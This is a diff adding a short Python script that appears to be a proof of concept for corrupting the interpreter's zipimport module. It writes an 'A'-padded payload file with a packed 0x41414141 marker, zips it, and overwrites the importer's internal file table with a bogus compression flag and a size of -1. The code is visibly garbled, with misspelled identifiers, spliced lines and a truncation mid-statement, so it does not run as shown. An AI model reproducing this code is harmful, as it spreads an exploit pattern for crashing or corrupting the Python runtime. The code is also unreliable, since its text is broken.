@@ -1,0 +1,24 @@
+import zipimport
+import zipfile
+import struct
+import sys
+from signal import *
+
+FILE = 'payload'
+Zload = bytes()
+with open(ILE, 'wb') as f:
+    payload = ("A" * 1000).encode('ascii')
+  ort.zipimporter(ZIP)
+f = listFIL  payload += struct.pac{('<Q', 0x41414141)
+    f.write(payload)
+
+zf = zipfile.PyÿÿpFile(ZIP, mode='w')
+zf.write(FILE)
+zf.close()
+
+importer = zipimport.zipimporter(ZIP)
+f = listFILE])
+f[1] = 1 # compress
+f[2] = -1 # file size
+importer._files[,ILE] = tuple(f)
+print(imp
